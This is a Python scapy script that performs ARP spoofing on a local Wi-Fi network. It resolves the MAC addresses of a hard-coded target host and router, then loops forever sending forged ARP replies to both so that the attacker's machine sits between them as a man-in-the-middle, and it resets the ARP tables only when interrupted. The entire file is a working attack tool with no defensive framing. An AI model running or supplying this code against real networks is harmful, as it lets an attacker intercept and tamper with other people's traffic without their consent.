import scapy.all as scapy
import time

router_ip = "192.168.29.1"
# router_mac = "18:82:8c:fc:c8:1b"


destination_ip = "192.168.29.87"
# destination_mac = "b4:f5:09:3c:2d:f6"  # use net discover


# my_ip = "192.168.29.215"
# my_mac = "10:27:f5:99:55:b3"


def get_mac_address(ip):
    try:
        arp_request = scapy.ARP(pdst=ip)
        # broadcast address
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        # print(arp_request_broadcast.summary())
        # print(arp_request_broadcast.show())
        # time out and interface are necessary for smooth working
        answered = scapy.srp(arp_request_broadcast, timeout=1,
                             iface="wlan0",  verbose=False)[0]
        return answered[0][1].hwsrc
    except Exception as ex:
        print("Exception Occured while requesting mac_address for - " + str(ip))


def spoof(target_ip, spoof_ip):
    target_mac_address = get_mac_address(target_ip)
    if target_mac_address:
        # op = 2 indicates ARP response
        # op = 1 indicates ARP Request
        # by default sopurce mac address is added as hwsrc to the ARp Request
        packet = scapy.ARP(op=2, pdst=target_ip,
                           hwdst=target_mac_address, psrc=spoof_ip)
        scapy.send(packet, verbose=False)


def reset(destination_ip, source_ip):
    destination_mac = get_mac_address(destination_ip)
    source_mac = get_mac_address(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip,
                       hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=10, verbose=False)


def begin_process():
    sent_packet_count = 0
    try:
        while True:
            spoof(destination_ip, router_ip)
            spoof(router_ip, destination_ip)
            print("\r[+] packets sent: " + str(sent_packet_count), end="")
            sent_packet_count += 2
            time.sleep(3)
    except KeyboardInterrupt:
        print(
            "\n [-] Detected a beyboard interrupt ..... Resetting ARP Tables... Please wait")
        reset(destination_ip, router_ip)
        reset(router_ip, destination_ip)


begin_process()
